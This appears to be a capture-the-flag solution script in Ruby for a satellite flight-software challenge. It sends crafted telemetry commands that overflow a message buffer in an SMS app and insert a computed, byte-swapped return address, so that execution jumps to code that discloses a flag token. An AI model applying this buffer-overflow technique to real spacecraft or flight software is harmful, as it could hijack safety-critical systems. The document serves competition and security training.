# Enable telemetry
cmd("KIT_TO ENABLE_TELEMETRY with CCSDS_STREAMID 6272, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 17, CCSDS_FUNCCODE 5, CCSDS_CHECKSUM 0, IP_ADDR 192.168.3.1")
# Make sure we are getting telemetry before proceeding. Did we actually establish contact with the satellite?
wait_packet('EPS', 'BATTERY', 1, 10, 0.1)

# Get challenge app address
cmd("CFE_ES SEND_APP_INFO with CCSDS_STREAMID 6150, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 21, CCSDS_FUNCCODE 8, CCSDS_CHECKSUM 0, APP_NAME SPACEFLAG")
wait_packet('CFE_ES', 'APP_INFO_TLM_PKT', 1, 10, 0.1)
start = 0xde8
# Offset from binary RE
offset = 0x58e
target = 0x1396
puts "Start:   0x#{start.to_s(16)}"
puts "Offset:  0x#{offset.to_s(16)}"
puts "Target:  0x#{target.to_s(16)}"

# A sufficiently long message to trip NORMAL_MSG
msg = "CromulanstheBOMBulansCromulanstheBOMBulansCromulanstheBOMBulansCromulanstheBOMBulansCr"
cmd("SMS NORMAL_MSG with CCSDS_STREAMID 8048, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 109, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, COUNT_CHK 0, INTERNAL_USE 1722, MESSAGE "+msg)

target = tlm("CFE_ES APP_INFO_TLM_PKT START_ADDR") + offset
target = target.to_s(16)
p1 = target[0..3]
p2 = target[4..7]
target = "0x"+ p2 + p1
puts "SWAPPED: #{target}"

# Swap the bytes of the target address and insert into count_check and internal_use fields of extended_msg
cmd("SMS EXTENDED_MSG with CCSDS_STREAMID 8064, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 209, CCSDS_FUNCCODE 3, CCSDS_CHECKSUM 0, COUNT_CHK "+target+", INTERNAL_USE "+target+", MESSAGE whateva")
wait_packet('SPACEFLAG', 'TOKEN_TLM_PKT', 1, 10, 0.1)

# Git flag
flag = tlm("SPACEFLAG TOKEN_TLM_PKT TOKEN")
puts "FLAG:  #{flag}"
puts "FLAG:  #{flag}"
puts "FLAG:  #{flag}"
